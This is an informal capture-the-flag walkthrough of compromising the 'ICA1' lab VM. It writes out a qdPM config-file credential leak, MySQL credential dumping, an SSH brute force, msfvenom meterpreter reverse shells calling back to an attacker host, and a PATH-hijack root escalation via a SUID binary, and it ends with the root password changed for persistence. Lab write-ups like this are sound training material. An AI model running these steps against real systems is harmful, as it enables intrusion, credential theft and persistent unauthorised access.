---
title: ICA1
tags:
  - fetus
---
## nmap results:
- `nmap -sV IP`:
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-25 14:34 EDT
Nmap scan report for 10.0.2.9
Host is up (0.036s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
3306/tcp open  mysql   MySQL 8.0.26
MAC Address: 08:00:27:27:8E:16 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.01 seconds
```
- `Ascan.txt`: [[ICA1-AscanResult]] 
- ssh has an account takeover vulnerability: https://github.com/LucasPDiniz/CVE-2023-38408
## http enum:
- root page: <br>
![[ICA1HttpRootPageSS.png]]
- there wasnt anything interesting that jumped out in the source. 
- huh it has cred validation just like wordpress i think??? maybe wrong <br>
![[ICA1CredValSS.png]]
- version: `qdPM 9.2`. its a `Free Web-Based Project Management Software (PHP/MySql)` 
- did `searchsploit` with the version. got these two:
```sh
qdPM 9.2 - Cross-site Request Forgery (CSRF)         | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)       | php/webapps/50176.txt
```
- hell yeah
- lets mirror the send one with `searchsploit -m php/webapps/50176.txt`
- it says this:
```txt
# Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
# Date: 03/08/2021
# Exploit Author: Leon Trappett (thepcn3rd)
# Vendor Homepage: https://qdpm.net/
# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
# Version: 9.2
# Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4

The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download.
```
- daaamn
- yup the link works. gives me the `databases.yml` file immediately
- `databases.yml`:
```yml
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      profiler: false
      username: qdpmadmin
      password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
      attributes:
        quote_identifier: true
```
- heeellllllllll yeahhhhhhhhhhhhhhhh [[mysql]] creds gottttttttttt
```
qdpmadmin:UcVQCMQk2STVeS6J
```
## mysql enum
- got in. 
- did `show databases;` and got these databases:
```mysql
information_schema
mysql 
performance_schema 
qdpm 
staff
sys
```
- couldnt find creds in the `qdpm` db. the users and most other tables were empty sets 
- lets try the `staff` db now
- `show tables;`:
```mysql
department
login
user
```
- `select * from department;`:
```mysql
+------+----------+
| id   | name     |
+------+----------+
|    1 | Agent    |
|    2 | Engineer |
+------+----------+
```
- `select * from login;`:
```mysql
+------+---------+--------------------------+
| id   | user_id | password                 |
+------+---------+--------------------------+
|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |
|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
+------+---------+--------------------------+
```
- cringe its unsorted
- `select * from login order by user_id asc;`:
```mysql
+------+---------+--------------------------+
| id   | user_id | password                 |
+------+---------+--------------------------+
|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |
|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
+------+---------+--------------------------+
```
- thats better. these are probably base64 encoded. lets decode them
- [[base64ListDecoderOneLiner]]:
```
X7MQkP3W29fewHdC
suRJAdGwLp8dy3rF
DJceVy98W28Y7wLg
7ZwV4qtg42cmUXGX
cqNnBWCByS2DuJSy
```
- `select * from user;`:
```mysql
+------+---------------+--------+---------------------------+
| id   | department_id | name   | role                      |
+------+---------------+--------+---------------------------+
|    1 |             1 | Smith  | Cyber Security Specialist |
|    2 |             2 | Lucas  | Computer Engineer         |
|    3 |             1 | Travis | Intelligence Specialist   |
|    4 |             1 | Dexter | Cyber Security Analyst    |
|    5 |             2 | Meyer  | Genetic Engineer          |
+------+---------------+--------+---------------------------+
```
- noway since when is dexter morgan a cybersecurity analyst lmao
- unames: 
```
smith
lucas
travis
dexter
meyer
```
- hell yeah now lets brute force ssh with [[hydra]]
- got them credsssssssssss :D
```
travis:DJceVy98W28Y7wLg
dexter:7ZwV4qtg42cmUXGX
```
## gaining access and priv esc:
### dexter:
- has no sudo capabilities
- `note.txt`:
```txt
It seems to me that there is a weakness while accessing the system.
As far as I know, the contents of executable files are partially viewable.
I need to find out if there is a vulnerability or not.
```
### travis:
- has no sudo capabilities either
- `user.txt`:
```txt
ICA{Secret_Project}
```
### getting meterpreter shells:
- `uname -a`:
```sh
Linux debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64 GNU/Linux
```
- lets get meterpreter sessions on bother users
- `msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o shellDexter.elf LHOST=10.0.2.10 LPORT=1400`
- `msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o shellTravis.elf LHOST=10.0.2.10 LPORT=1500`
- made a python server. uploaded them both to the `/tmp` directory
- started [[metasploit_framework]]
- `use exploit/multi/handler`
- set the proper ports, payloads and lport and ran the listeners
- ran the files from the victim machines
- hell yeah meterpreter sessions
### [[meterpreter]] shenanigans:
- `run post/multi/recon/local_exploit_suggester`: <br>

![[ICA1ExploitSuggesterSS.png]]
```sh
 #   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/cve_2022_0847_dirtypipe                         Yes                      The target appears to be vulnerable. Linux kernel version found: 5.10.0                                                                                                                                               
 2   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 3   exploit/linux/local/glibc_tunables_priv_esc                         Yes                      The target appears to be vulnerable. The glibc version (2.31-13) found on the target appears to be vulnerable                                                                                                         
 4   exploit/linux/local/netfilter_nft_set_elem_init_privesc             Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/netfilter_priv_esc_ipv4                         Yes                      The target appears to be vulnerable.
 6   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
 7   exploit/linux/local/sudoedit_bypass_priv_esc                        Yes                      The target appears to be vulnerable. Sudo 1.9.5p2.pre.3 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module 
```
- `cve_2022_0847_dirtypipe` seems interesting. a kernel exploit for local priv esc: https://www.picussecurity.com/resource/linux-dirty-pipe-cve-2022-0847-vulnerability-exploitation-explained
- ran `pspy` while i was reading that: [[ICA1-pspyOutput]] 
- lets test `CVE-2022-0847`:
	- lets check if its truly vulnerable first with https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker.git
	- yup vulnerable 
	- need some suid binaries. ykwhat fuck it imma just get a [[pwncat-cs]] shell. sacrificed dexter's [[meterpreter]] 
	- [[pwncat-cs]] output: [[ICA1PwncatEnumOutput]] 
	- okay now i just need to git clone this and compile: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
	- ran it. didnt work
- lets look into `cve_2022_0995_watch_queue` instead
	- ooh a metasploit moduuleeee i already have a meterpreter session. lets try this one real quick
	- yk what no ill do it manually instead 
	- found something: https://github.com/Bonfee/CVE-2022-0995
	- doesnt even compile <br> ![[chirken.jpg]]
	- fine ill try the metasploit module 
	- doesnt work (╯‵□′)╯︵┻━┻
- okay lets try `exploit/linux/local/glibc_tunables_priv_esc` now 
	- lmao it broke meterpreter xDDDDDDDDDDDDDDDDDD <br> ![[shinji.jpg]]
- `exploit/linux/local/netfilter_nft_set_elem_init_privesc` failed as well
- so did `exploit/linux/local/su_login`
- and neither did `exploit/linux/local/sudoedit_bypass_priv_esc`
- you know what. lets get back to the basics
- `/opt/get_access owned by root` was something that had its suid set. lets check what it does. seems sus.
- ran it. we get this:
```sh
  ############################
  ########     ICA     #######
  ### ACCESS TO THE SYSTEM ###
  ############################

  Server Information:
   - Firewall:  AIwall v9.5.2
   - OS:        Debian 11 "bullseye"
   - Network:   Local Secure Network 2 (LSN2) v 2.4.1

All services are disabled. Accessing to the system is allowed only within working hours.
```
- ltrace isnt available. imma try strings then
- strings output:
```sh
/lib64/ld-linux-x86-64.so.2
setuid
socket
puts
system
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
cat /root/system.info
Could not create socket to access to the system.
All services are disabled. Accessing to the system is allowed only within working hours.
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
get_access.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
system@GLIBC_2.2.5
__libc_start_main@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
socket@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```
- it does something with a file in roots directory. cats it
- imma try that PATH thing since it doesnt have its path set 
- lolz "cat cat"
```sh
travis@debian:/tmp$ echo '/bin/bash' > cat
travis@debian:/tmp$ cat cat
/bin/bash
```
- updated the `$PATH` system variable:
```sh
travis@debian:/tmp$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
travis@debian:/tmp$ export PATH=/tmp:$PATH
travis@debian:/tmp$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```
- lets run it and see what happens
- nothing happened
- oh bruh my dumass didnt even make the skinwalker `cat` executable lmao
- `chmod 777 cat`
- lets run it now and see what happens <br>
![[ICA1HASBEENROOTED.png]]
- FULL ROOT BABYYYYYYYYYYYYYYYYYYYYYYY
- changed `root`'s password to `root` as well for later access hqhqhqhq
- gonna go to sleep now smh its 3am (ill never survive actual CTFs if im this shit lmfao)<br> ![[laughingTREE.jpg]]
